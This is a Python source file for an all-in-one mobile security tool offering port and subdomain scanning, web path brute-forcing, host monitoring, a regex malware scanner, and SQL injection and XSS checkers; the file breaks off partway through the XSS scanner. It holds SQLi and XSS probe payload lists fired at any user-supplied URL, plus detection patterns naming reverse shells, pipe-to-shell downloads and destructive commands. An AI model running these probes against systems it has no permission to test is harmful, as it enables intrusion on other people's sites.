#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════╗
║                   DRGXEL CyberPack v1.0 BETA TESTER                       ║
║           Python Single-File Mega Security Tool               ║
║                  100% Termux Compatible                       ║
╚═══════════════════════════════════════════════════════════════╝

Author: DRGXEL Team
License: Educational Purpose Only
Warning: Use only on systems you own or have permission to test
"""

import os
import sys
import socket
import subprocess
import platform
import time
import re
from datetime import datetime
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError

# ============================================================
# GLOBAL CONFIGURATION
# ============================================================
VERSION = "1.0 BETA TESTER"
LOG_FILE = os.path.expanduser("~/drgxel_logs.txt")

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def print_banner():
    banner = f"""
\033[1;36m╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██████╗ ██████╗  ██████╗ ██╗  ██╗███████╗██╗               ║
║   ██╔══██╗██╔══██╗██╔════╝ ██║  ██║██╔════╝██║               ║
║   ██║  ██║██████╔╝██║  ███╗███████║█████╗  ██║               ║
║   ██║  ██║██╔══██╗██║   ██║╚════██║██╔══╝  ██║               ║
║   ██████╔╝██║  ██║╚██████╔╝     ██║███████╗███████╗          ║
║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝      ╚═╝╚══════╝╚══════╝          ║
║                                                               ║
║              CyberPack v{VERSION} - Security MegaTool              ║
║                   Single-File Python Edition                  ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝\033[0m
    """
    print(banner)

def log_activity(message):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        print(f"\033[1;31m[!] Log error: {e}\033[0m")

def print_success(message):
    print(f"\033[1;32m[✓] {message}\033[0m")

def print_error(message):
    print(f"\033[1;31m[✗] {message}\033[0m")

def print_info(message):
    print(f"\033[1;34m[i] {message}\033[0m")

def print_warning(message):
    print(f"\033[1;33m[!] {message}\033[0m")

def recon_menu():
    """Recon Scanner Menu"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ RECON SCANNER ═══\033[0m\n")
    print("1. Ping Test")
    print("2. Port Scanner")
    print("3. Subdomain Scanner")
    print("0. Back to Main Menu\n")
    
    choice = input("\033[1;33m[?] Select option: \033[0m")
    
    if choice == '1':
        ping_test()
    elif choice == '2':
        port_scanner()
    elif choice == '3':
        subdomain_scanner()
    elif choice == '0':
        return
    else:
        print_error("Invalid option!")
        time.sleep(1)
        recon_menu()

def ping_test():
    """Simple ping test"""
    print("\n\033[1;36m═══ PING TEST ═══\033[0m")
    target = input("\n[?] Enter target (IP/domain): ").strip()
    
    if not target:
        print_error("Target cannot be empty!")
        time.sleep(2)
        return
    
    print_info(f"Pinging {target}...")
    log_activity(f"Ping test to {target}")
    
    try:
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        command = ['ping', param, '4', target]
        result = subprocess.run(command, capture_output=True, text=True, timeout=10)
        
        print(result.stdout)
        
        if result.returncode == 0:
            print_success(f"{target} is reachable!")
        else:
            print_error(f"{target} is unreachable!")
            
    except subprocess.TimeoutExpired:
        print_error("Ping timeout!")
    except Exception as e:
        print_error(f"Ping failed: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def port_scanner():
    """Simple port scanner"""
    print("\n\033[1;36m═══ PORT SCANNER ═══\033[0m")
    target = input("\n[?] Enter target IP/domain: ").strip()
    
    if not target:
        print_error("Target cannot be empty!")
        time.sleep(2)
        return
    
    # Common ports to scan
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]
    
    print_info(f"Scanning {target}...")
    print_info(f"Scanning {len(common_ports)} common ports...\n")
    log_activity(f"Port scan on {target}")
    
    open_ports = []
    
    try:
        target_ip = socket.gethostbyname(target)
        print_info(f"Resolved to: {target_ip}\n")
        
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            
            if result == 0:
                print_success(f"Port {port} is OPEN")
                open_ports.append(port)
            else:
                print(f"Port {port} is closed", end='\r')
            
            sock.close()
        
        print("\n")
        if open_ports:
            print_success(f"Found {len(open_ports)} open ports: {open_ports}")
        else:
            print_warning("No open ports found in common port range")
            
    except socket.gaierror:
        print_error("Hostname could not be resolved!")
    except socket.error:
        print_error("Could not connect to server!")
    except Exception as e:
        print_error(f"Scan error: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def subdomain_scanner():
    """Simple subdomain scanner"""
    print("\n\033[1;36m═══ SUBDOMAIN SCANNER ═══\033[0m")
    domain = input("\n[?] Enter domain (e.g., example.com): ").strip()
    
    if not domain:
        print_error("Domain cannot be empty!")
        time.sleep(2)
        return
    
    # Internal wordlist for subdomains
    subdomains = [
        'www', 'mail', 'ftp', 'admin', 'blog', 'shop', 'api', 'dev', 
        'test', 'staging', 'beta', 'portal', 'secure', 'vpn', 'remote',
        'dashboard', 'cpanel', 'webmail', 'smtp', 'pop', 'imap', 'ns1', 
        'ns2', 'dns', 'mx', 'cdn', 'static', 'media', 'images'
    ]
    
    print_info(f"Scanning subdomains for {domain}...")
    print_info(f"Testing {len(subdomains)} common subdomains...\n")
    log_activity(f"Subdomain scan on {domain}")
    
    found = []
    
    for sub in subdomains:
        subdomain = f"{sub}.{domain}"
        try:
            socket.gethostbyname(subdomain)
            print_success(f"Found: {subdomain}")
            found.append(subdomain)
        except socket.gaierror:
            print(f"Testing: {subdomain}", end='\r')
        except Exception:
            pass
    
    print("\n")
    if found:
        print_success(f"Found {len(found)} valid subdomains!")
        for s in found:
            print(f"  • {s}")
    else:
        print_warning("No subdomains found")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def web_vuln_scanner():
    """Mini-Nikto style web vulnerability scanner"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ WEB VULNERABILITY SCANNER ═══\033[0m\n")
    
    url = input("[?] Enter target URL (e.g., http://example.com): ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print_info(f"Scanning {url}...")
    log_activity(f"Web vuln scan on {url}")
    
    # Common vulnerable paths
    vuln_paths = [
        '/admin', '/administrator', '/login', '/wp-admin', '/phpmyadmin',
        '/cpanel', '/dashboard', '/admin.php', '/login.php', '/config.php',
        '/.git', '/.env', '/backup', '/.htaccess', '/web.config',
        '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
        '/robots.txt', '/sitemap.xml', '/.well-known', '/api',
        '/upload', '/uploads', '/files', '/images', '/temp'
    ]
    
    found_paths = []
    
    print("\n")
    for path in vuln_paths:
        full_url = url.rstrip('/') + path
        try:
            req = Request(full_url, headers={'User-Agent': 'DRGXEL-Scanner/1.0'})
            response = urlopen(req, timeout=5)
            status_code = response.getcode()
            
            if status_code == 200:
                print_success(f"[{status_code}] {path}")
                found_paths.append((path, status_code))
            elif status_code in [301, 302]:
                print_warning(f"[{status_code}] {path} (Redirect)")
                found_paths.append((path, status_code))
            else:
                print(f"Testing: {path}", end='\r')
                
        except HTTPError as e:
            if e.code == 403:
                print_warning(f"[403] {path} (Forbidden)")
                found_paths.append((path, 403))
            else:
                print(f"Testing: {path}", end='\r')
        except:
            print(f"Testing: {path}", end='\r')
    
    print("\n")
    if found_paths:
        print_success(f"Found {len(found_paths)} interesting paths!")
        for path, code in found_paths:
            print(f"  • [{code}] {path}")
    else:
        print_warning("No interesting paths found")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def directory_bruteforce():
    """Directory bruteforce with internal wordlist"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ DIRECTORY BRUTEFORCE ═══\033[0m\n")
    
    url = input("[?] Enter target URL (e.g., http://example.com): ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    # Internal wordlist
    wordlist = [
        'admin', 'administrator', 'login', 'dashboard', 'panel', 'cpanel',
        'user', 'users', 'account', 'accounts', 'profile', 'settings',
        'config', 'configuration', 'setup', 'install', 'installation',
        'backup', 'backups', 'db', 'database', 'sql', 'mysql',
        'upload', 'uploads', 'files', 'file', 'download', 'downloads',
        'images', 'img', 'image', 'media', 'assets', 'static',
        'css', 'js', 'javascript', 'styles', 'scripts',
        'api', 'v1', 'v2', 'rest', 'graphql',
        'test', 'testing', 'debug', 'dev', 'development',
        'staging', 'beta', 'alpha', 'demo',
        'docs', 'documentation', 'help', 'support',
        'blog', 'news', 'articles', 'posts',
        'shop', 'store', 'cart', 'checkout', 'products',
        'about', 'contact', 'home', 'index'
    ]
    
    print_info(f"Bruteforcing {url}...")
    print_info(f"Wordlist size: {len(wordlist)} entries\n")
    log_activity(f"Directory bruteforce on {url}")
    
    found = []
    
    for word in wordlist:
        full_url = url.rstrip('/') + '/' + word
        try:
            req = Request(full_url, headers={'User-Agent': 'DRGXEL-Scanner/1.0'})
            response = urlopen(req, timeout=3)
            status_code = response.getcode()
            
            if status_code == 200:
                print_success(f"[{status_code}] /{word}")
                found.append((word, status_code))
            else:
                print(f"Testing: /{word}", end='\r')
                
        except HTTPError as e:
            if e.code in [301, 302, 403]:
                print_warning(f"[{e.code}] /{word}")
                found.append((word, e.code))
            else:
                print(f"Testing: /{word}", end='\r')
        except:
            print(f"Testing: /{word}", end='\r')
    
    print("\n")
    if found:
        print_success(f"Found {len(found)} directories!")
        for dir_name, code in found:
            print(f"  • [{code}] /{dir_name}")
    else:
        print_warning("No directories found")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def device_info():
    """Display device information"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ DEVICE INFORMATION ═══\033[0m\n")
    log_activity("Device info checked")
    
    try:
        # System Information
        print("\033[1;33m[System Information]\033[0m")
        print(f"  OS: {platform.system()} {platform.release()}")
        print(f"  Version: {platform.version()}")
        print(f"  Machine: {platform.machine()}")
        print(f"  Processor: {platform.processor()}")
        print(f"  Architecture: {platform.architecture()[0]}")
        print(f"  Hostname: {socket.gethostname()}")
        
        # CPU Information
        print("\n\033[1;33m[CPU Information]\033[0m")
        try:
            if platform.system() == "Linux":
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read()
                    cpu_model = re.search(r'model name\s+:\s+(.+)', cpuinfo)
                    if cpu_model:
                        print(f"  Model: {cpu_model.group(1)}")
                    
                    cpu_cores = cpuinfo.count('processor')
                    print(f"  Cores: {cpu_cores}")
            else:
                print("  CPU details not available on this platform")
        except:
            print("  Unable to read CPU info")
        
        # Memory Information
        print("\n\033[1;33m[Memory Information]\033[0m")
        try:
            if platform.system() == "Linux":
                with open('/proc/meminfo', 'r') as f:
                    meminfo = f.read()
                    mem_total = re.search(r'MemTotal:\s+(\d+)', meminfo)
                    mem_free = re.search(r'MemFree:\s+(\d+)', meminfo)
                    mem_available = re.search(r'MemAvailable:\s+(\d+)', meminfo)
                    
                    if mem_total:
                        print(f"  Total RAM: {int(mem_total.group(1)) // 1024} MB")
                    if mem_free:
                        print(f"  Free RAM: {int(mem_free.group(1)) // 1024} MB")
                    if mem_available:
                        print(f"  Available RAM: {int(mem_available.group(1)) // 1024} MB")
            else:
                print("  Memory details not available on this platform")
        except:
            print("  Unable to read memory info")
        
        # Storage Information
        print("\n\033[1;33m[Storage Information]\033[0m")
        try:
            if platform.system() == "Linux":
                result = subprocess.run(['df', '-h', '/'], capture_output=True, text=True)
                lines = result.stdout.strip().split('\n')
                if len(lines) > 1:
                    parts = lines[1].split()
                    print(f"  Total: {parts[1]}")
                    print(f"  Used: {parts[2]}")
                    print(f"  Available: {parts[3]}")
                    print(f"  Usage: {parts[4]}")
            else:
                print("  Storage details not available on this platform")
        except:
            print("  Unable to read storage info")
        
        # Kernel Information
        print("\n\033[1;33m[Kernel Information]\033[0m")
        try:
            if platform.system() == "Linux":
                kernel_version = subprocess.run(['uname', '-r'], capture_output=True, text=True)
                print(f"  Version: {kernel_version.stdout.strip()}")
            else:
                print(f"  Version: {platform.release()}")
        except:
            print("  Unable to read kernel info")
        
        # Network Information
        print("\n\033[1;33m[Network Information]\033[0m")
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            print(f"  Local IP: {local_ip}")
        except:
            print("  Unable to get network info")
        
    except Exception as e:
        print_error(f"Error getting device info: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def anti_ddos_checker():
    """Check for potential DDoS activity"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ ANTI-DDOS CHECKER ═══\033[0m\n")
    log_activity("Anti-DDoS check performed")
    
    print_info("Checking for suspicious network activity...\n")
    
    try:
        if platform.system() == "Linux":
            # Check for unusual connection counts
            print("\033[1;33m[Connection Statistics]\033[0m")
            
            try:
                result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, timeout=5)
                connections = result.stdout
                
                established = connections.count('ESTABLISHED')
                time_wait = connections.count('TIME_WAIT')
                syn_recv = connections.count('SYN_RECV')
                
                print(f"  ESTABLISHED: {established}")
                print(f"  TIME_WAIT: {time_wait}")
                print(f"  SYN_RECV: {syn_recv}")
                
                # Simple heuristic for potential DDoS
                if syn_recv > 50:
                    print_warning("  ⚠ High number of SYN_RECV - possible SYN flood!")
                elif time_wait > 100:
                    print_warning("  ⚠ High number of TIME_WAIT connections")
                elif established > 200:
                    print_warning("  ⚠ Unusually high number of established connections")
                else:
                    print_success("  ✓ Connection counts appear normal")
                    
            except subprocess.TimeoutExpired:
                print_error("Netstat command timed out")
            except FileNotFoundError:
                print_error("Netstat command not found")
            
            # Check connection rate
            print("\n\033[1;33m[Connection Rate Analysis]\033[0m")
            try:
                result = subprocess.run(['ss', '-s'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    print(result.stdout)
                else:
                    print_warning("Unable to analyze connection rate")
            except:
                print_warning("ss command not available")
            
            # Check for port scan patterns
            print("\n\033[1;33m[Security Alerts]\033[0m")
            print_info("Monitoring for unusual patterns...")
            
            try:
                result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                
                port_connections = {}
                for line in lines:
                    if 'ESTABLISHED' in line or 'SYN_RECV' in line:
                        parts = line.split()
                        if len(parts) > 4:
                            foreign_addr = parts[4]
                            ip = foreign_addr.split(':')[0]
                            if ip not in ['127.0.0.1', '0.0.0.0', '::1']:
                                port_connections[ip] = port_connections.get(ip, 0) + 1
                
                # Check for IPs with multiple connections
                suspicious = {ip: count for ip, count in port_connections.items() if count > 10}
                
                if suspicious:
                    print_warning(f"Found {len(suspicious)} IPs with multiple connections:")
                    for ip, count in list(suspicious.items())[:5]:
                        print(f"    • {ip}: {count} connections")
                else:
                    print_success("No suspicious connection patterns detected")
                    
            except Exception as e:
                print_error(f"Unable to analyze patterns: {e}")
        
        else:
            print_warning("Anti-DDoS checker is optimized for Linux systems")
            print_info("Basic network statistics:")
            
            try:
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                print(f"  Local IP: {local_ip}")
                print_info("For detailed DDoS protection, use this tool on Linux/Termux")
            except:
                print_error("Unable to get network info")
    
    except Exception as e:
        print_error(f"Error during DDoS check: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def malware_scanner():
    """Scan files for malicious patterns"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ MALWARE SCANNER ═══\033[0m\n")
    
    scan_path = input("[?] Enter path to scan (default: current directory): ").strip()
    if not scan_path:
        scan_path = "."
    
    if not os.path.exists(scan_path):
        print_error("Path does not exist!")
        time.sleep(2)
        return
    
    print_info(f"Scanning {scan_path} for malicious patterns...\n")
    log_activity(f"Malware scan on {scan_path}")
    
    # Malicious patterns to detect
    patterns = {
        'forkbomb': r':\(\)\s*\{\s*:\|\:&\s*\}\s*;',
        'rm_rf': r'rm\s+-rf\s+/',
        'curl_sh': r'curl.*\|\s*sh',
        'wget_sh': r'wget.*\|\s*sh',
        'eval_base64': r'eval.*base64',
        'nc_reverse': r'nc.*-e\s+/bin/(bash|sh)',
        'python_shell': r'import\s+pty.*pty\.spawn',
        'chmod_777': r'chmod\s+777',
        'suspicious_cron': r'crontab.*\|\s*sh',
        'password_grab': r'grep.*password',
    }
    
    suspicious_files = []
    scanned_count = 0
    
    try:
        for root, dirs, files in os.walk(scan_path):
            for file in files:
                if file.endswith(('.sh', '.py', '.php', '.pl')):
                    filepath = os.path.join(root, file)
                    scanned_count += 1
                    
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            detected = []
                            for pattern_name, pattern in patterns.items():
                                if re.search(pattern, content, re.IGNORECASE):
                                    detected.append(pattern_name)
                            
                            if detected:
                                print_warning(f"Suspicious: {filepath}")
                                print(f"  Patterns: {', '.join(detected)}")
                                suspicious_files.append((filepath, detected))
                            else:
                                print(f"Scanning: {filepath}", end='\r')
                    except:
                        pass
        
        print("\n")
        print_info(f"Scanned {scanned_count} files")
        
        if suspicious_files:
            print_warning(f"\nFound {len(suspicious_files)} suspicious files!")
            print("\n\033[1;33m[Suspicious Files]\033[0m")
            for filepath, patterns in suspicious_files:
                print(f"  • {filepath}")
                print(f"    Patterns: {', '.join(patterns)}")
        else:
            print_success("No malicious patterns detected!")
    
    except Exception as e:
        print_error(f"Scan error: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def process_watchdog():
    """Monitor suspicious processes"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ PROCESS WATCHDOG ═══\033[0m\n")
    log_activity("Process watchdog check")
    
    print_info("Analyzing running processes...\n")
    
    try:
        if platform.system() == "Linux":
            # Get process list with CPU and memory usage
            print("\033[1;33m[High CPU Processes]\033[0m")
            try:
                result = subprocess.run(['ps', 'aux', '--sort=-pcpu'], 
                                      capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')[1:11]  # Top 10
                
                for line in lines:
                    if line.strip():
                        parts = line.split(None, 10)
                        if len(parts) >= 11:
                            cpu = parts[2]
                            mem = parts[3]
                            cmd = parts[10]
                            
                            cpu_val = float(cpu) if cpu.replace('.', '').isdigit() else 0
                            
                            if cpu_val > 50:
                                print_warning(f"  CPU: {cpu}% | MEM: {mem}% | {cmd[:60]}")
                            else:
                                print(f"  CPU: {cpu}% | MEM: {mem}% | {cmd[:60]}")
            except Exception as e:
                print_error(f"Unable to get process list: {e}")
            
            # Check for suspicious process names
            print("\n\033[1;33m[Suspicious Process Names]\033[0m")
            suspicious_names = ['nc', 'ncat', 'netcat', 'socat', 'reverse', 
                              'backdoor', 'rootkit', 'miner', 'cryptominer']
            
            try:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
                found_suspicious = False
                
                for line in result.stdout.split('\n'):
                    for sus_name in suspicious_names:
                        if sus_name in line.lower():
                            print_warning(f"  Suspicious: {line.strip()[:80]}")
                            found_suspicious = True
                
                if not found_suspicious:
                    print_success("  No suspicious process names detected")
            except Exception as e:
                print_error(f"Unable to check process names: {e}")
            
            # Check network connections
            print("\n\033[1;33m[Network Connections]\033[0m")
            try:
                result = subprocess.run(['netstat', '-tunap'], 
                                      capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                
                connection_count = 0
                for line in lines:
                    if 'ESTABLISHED' in line:
                        connection_count += 1
                        if connection_count <= 5:
                            print(f"  {line.strip()[:80]}")
                
                if connection_count > 5:
                    print(f"  ... and {connection_count - 5} more connections")
                
                if connection_count > 50:
                    print_warning(f"  ⚠ High number of connections: {connection_count}")
                else:
                    print_success(f"  Connection count: {connection_count}")
                    
            except FileNotFoundError:
                print_warning("  netstat command not available")
            except Exception as e:
                print_error(f"Unable to check connections: {e}")
        
        else:
            print_warning("Process Watchdog is optimized for Linux/Termux systems")
            print_info("Basic process monitoring not available on this platform")
    
    except Exception as e:
        print_error(f"Error during process monitoring: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def network_monitor():
    """Monitor network connections and ports"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ NETWORK MONITOR ═══\033[0m\n")
    log_activity("Network monitor check")
    
    print_info("Monitoring network activity...\n")
    
    try:
        if platform.system() == "Linux":
            # Listening ports
            print("\033[1;33m[Listening Ports]\033[0m")
            try:
                result = subprocess.run(['netstat', '-tuln'], 
                                      capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                
                listening_ports = []
                for line in lines:
                    if 'LISTEN' in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            local_addr = parts[3]
                            if ':' in local_addr:
                                port = local_addr.split(':')[-1]
                                listening_ports.append(port)
                                print(f"  Port {port}: LISTENING")
                
                if listening_ports:
                    print_success(f"\n  Total listening ports: {len(listening_ports)}")
                else:
                    print_info("  No listening ports detected")
                    
            except FileNotFoundError:
                print_error("  netstat command not found")
            except Exception as e:
                print_error(f"  Error: {e}")
            
            # Active connections
            print("\n\033[1;33m[Active Connections]\033[0m")
            try:
                result = subprocess.run(['netstat', '-tun'], 
                                      capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                
                connections = []
                for line in lines:
                    if 'ESTABLISHED' in line or 'SYN_SENT' in line or 'SYN_RECV' in line:
                        connections.append(line.strip())
                        if len(connections) <= 10:
                            print(f"  {line.strip()[:80]}")
                
                if len(connections) > 10:
                    print(f"  ... and {len(connections) - 10} more connections")
                
                print_info(f"\n  Total active connections: {len(connections)}")
                
            except Exception as e:
                print_error(f"  Error getting connections: {e}")
            
            # Interface statistics
            print("\n\033[1;33m[Interface Statistics]\033[0m")
            try:
                with open('/proc/net/dev', 'r') as f:
                    lines = f.readlines()[2:]  # Skip headers
                    
                    for line in lines:
                        if ':' in line:
                            parts = line.split(':')
                            iface = parts[0].strip()
                            stats = parts[1].split()
                            
                            rx_bytes = int(stats[0])
                            tx_bytes = int(stats[8])
                            
                            if rx_bytes > 0 or tx_bytes > 0:
                                rx_mb = rx_bytes / (1024 * 1024)
                                tx_mb = tx_bytes / (1024 * 1024)
                                print(f"  {iface}:")
                                print(f"    RX: {rx_mb:.2f} MB")
                                print(f"    TX: {tx_mb:.2f} MB")
            except Exception as e:
                print_error(f"  Unable to read interface stats: {e}")
            
            # DNS information
            print("\n\033[1;33m[DNS Configuration]\033[0m")
            try:
                with open('/etc/resolv.conf', 'r') as f:
                    for line in f:
                        if line.startswith('nameserver'):
                            print(f"  {line.strip()}")
            except Exception as e:
                print_error(f"  Unable to read DNS config: {e}")
        
        else:
            print_warning("Network Monitor is optimized for Linux/Termux systems")
            
            # Basic network info for other platforms
            print("\033[1;33m[Basic Network Info]\033[0m")
            try:
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                print(f"  Hostname: {hostname}")
                print(f"  Local IP: {local_ip}")
            except:
                print_error("  Unable to get network info")
    
    except Exception as e:
        print_error(f"Error during network monitoring: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def view_syslog():
    """View DRGXEL system logs"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ DRGXEL SYSLOG ═══\033[0m\n")
    
    if not os.path.exists(LOG_FILE):
        print_warning(f"Log file not found: {LOG_FILE}")
        print_info("No logs have been recorded yet.")
        input("\n\033[1;33m[Press Enter to continue...]\033[0m")
        return
    
    print_info(f"Log file: {LOG_FILE}\n")
    
    try:
        with open(LOG_FILE, 'r') as f:
            logs = f.readlines()
        
        if logs:
            print(f"\033[1;33m[Recent Logs - Last {min(50, len(logs))} entries]\033[0m\n")
            
            # Display last 50 entries
            for log in logs[-50:]:
                print(f"  {log.strip()}")
            
            print(f"\n\033[1;32m[Total log entries: {len(logs)}]\033[0m")
        else:
            print_warning("Log file is empty")
        
        print("\n\033[1;33m[Options]\033[0m")
        print("1. Clear logs")
        print("0. Back")
        
        choice = input("\n[?] Select option: ").strip()
        
        if choice == '1':
            confirm = input("\n[?] Are you sure you want to clear logs? (yes/no): ").strip().lower()
            if confirm == 'yes':
                with open(LOG_FILE, 'w') as f:
                    f.write('')
                print_success("Logs cleared successfully!")
                log_activity("Logs cleared by user")
                time.sleep(2)
            else:
                print_info("Operation cancelled")
                time.sleep(1)
    
    except Exception as e:
        print_error(f"Error reading log file: {e}")
        time.sleep(2)

def sqli_checker():
    """Check for SQL Injection vulnerabilities"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ SQLi VULNERABILITY CHECKER ═══\033[0m\n")
    
    url = input("[?] Enter target URL with parameter (e.g., http://site.com/page.php?id=1): ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print_info(f"Testing {url} for SQL injection...\n")
    log_activity(f"SQLi check on {url}")
    
    # SQL injection payloads
    payloads = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "' AND 1=1 --",
        "' AND 1=2 --",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "' UNION SELECT NULL--",
        "') OR ('1'='1",
    ]
    
    # SQL error signatures
    error_signatures = [
        'sql syntax',
        'mysql_fetch',
        'mysql_num_rows',
        'mysql error',
        'warning: mysql',
        'unclosed quotation',
        'quoted string not properly terminated',
        'microsoft ole db provider for sql server',
        'incorrect syntax near',
        'syntax error',
        'odbc microsoft access driver',
        'microsoft jet database',
        'ora-01756',
        'ora-00933',
        'postgresql query failed',
        'pg_query',
        'sqlite3',
        'sqlstate',
    ]
    
    vulnerable = []
    
    try:
        # Get baseline response
        print_info("Getting baseline response...")
        req = Request(url, headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
        baseline_response = urlopen(req, timeout=10).read().decode('utf-8', errors='ignore')
        baseline_length = len(baseline_response)
        
        print_info(f"Baseline length: {baseline_length} bytes\n")
        
        for i, payload in enumerate(payloads, 1):
            # Parse URL and inject payload
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if not params:
                print_error("No parameters found in URL!")
                break
            
            # Inject into first parameter
            param_name = list(params.keys())[0]
            original_value = params[param_name][0]
            params[param_name] = [original_value + payload]
            
            # Rebuild URL
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                  parsed.params, new_query, parsed.fragment))
            
            try:
                req = Request(test_url, headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
                response = urlopen(req, timeout=10).read().decode('utf-8', errors='ignore')
                response_lower = response.lower()
                
                # Check for SQL errors
                for error_sig in error_signatures:
                    if error_sig in response_lower:
                        print_warning(f"[{i}/{len(payloads)}] VULNERABLE: {payload[:30]}")
                        print(f"    Error detected: {error_sig}")
                        vulnerable.append((payload, error_sig))
                        break
                else:
                    # Check for response length difference
                    length_diff = abs(len(response) - baseline_length)
                    if length_diff > 100:
                        print_warning(f"[{i}/{len(payloads)}] SUSPICIOUS: {payload[:30]}")
                        print(f"    Response length changed by {length_diff} bytes")
                        vulnerable.append((payload, "length_difference"))
                    else:
                        print(f"[{i}/{len(payloads)}] Testing: {payload[:30]}", end='\r')
                
                time.sleep(0.5)  # Be polite
                
            except HTTPError as e:
                if e.code == 500:
                    print_error(f"[{i}/{len(payloads)}] SERVER ERROR: {payload[:30]}")
                    vulnerable.append((payload, "500_error"))
            except:
                pass
        
        print("\n")
        if vulnerable:
            print_warning(f"⚠️  FOUND {len(vulnerable)} POTENTIAL SQLi VULNERABILITIES!")
            print("\n\033[1;33m[Vulnerable Payloads]\033[0m")
            for payload, detection in vulnerable[:10]:
                print(f"  • {payload}")
                print(f"    Detection: {detection}")
        else:
            print_success("✓ No SQL injection vulnerabilities detected")
    
    except Exception as e:
        print_error(f"Error during SQLi check: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def xss_scanner():
    """Simple XSS vulnerability scanner"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ XSS SCANNER MINI ═══\033[0m\n")
    
    url = input("[?] Enter target URL with parameter (e.g., http://site.com/search.php?q=test): ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print_info(f"Scanning {url} for XSS vulnerabilities...\n")
    log_activity(f"XSS scan on {url}")
    
    # XSS payloads
    payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '"><svg/onload=alert(1)>',
        '\'><img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
    ]
    
    vulnerable = []
    
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print_error("No parameters found in URL!")
            time.sleep(2)
            return
        
        param_name = list(params.keys())[0]
        
        for i, payload in enumerate(payloads, 1):
            # Inject payload
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            new_query = urlencode(test_params, doseq=True)
